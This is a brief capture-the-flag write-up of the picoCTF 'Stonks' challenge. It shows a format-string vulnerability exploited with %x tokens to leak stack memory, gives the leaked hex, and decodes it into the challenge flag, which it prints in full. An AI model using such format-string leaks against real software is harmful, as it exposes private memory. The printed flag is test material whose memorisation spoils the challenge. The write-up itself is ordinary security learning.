# Stonks CTF Writeup

## The Unraveling Journey

Admitting to seeking help from the internet for the Stonks CTF challenge, I grappled with buffer overflow issues until discovering the concept of Uncontrolled Format String. Despite receiving the same characters in buffer overflow attempts, I found success with format tokens like `%c`, producing seemingly random output (`0À`0pCI5lynb2}@`).

## Unveiling the Hex Output

Employing the `%x` format token, I obtained a lengthy hex string: 
`96ba3d0804b00080489c3f7fc1d80ffffffff196b8160f7fcf110f7fc1dc7096b9180f96ba3b096ba3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532fff0007df7ffcaf8f7fcf440aa15f00010f7e5ece9f7fd00c0f7fc15c0f7fc1000fff01348`

## Decoding the Hex

Converting the hex to ASCII, I obtained:
º=°H?ÁØÿÿÿñ¸ÏÁÜp¹º;k£Ðocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿð}÷ÿÊø÷üô@ªð÷åìé÷ýÀ÷üÀ÷üÿðH

## Unraveling the Flag

Observing a potential flag format (`ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿð}÷`), I noticed each 4-character block appeared reversed. I manually reversed each block, revealing the final flag:

`picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}`

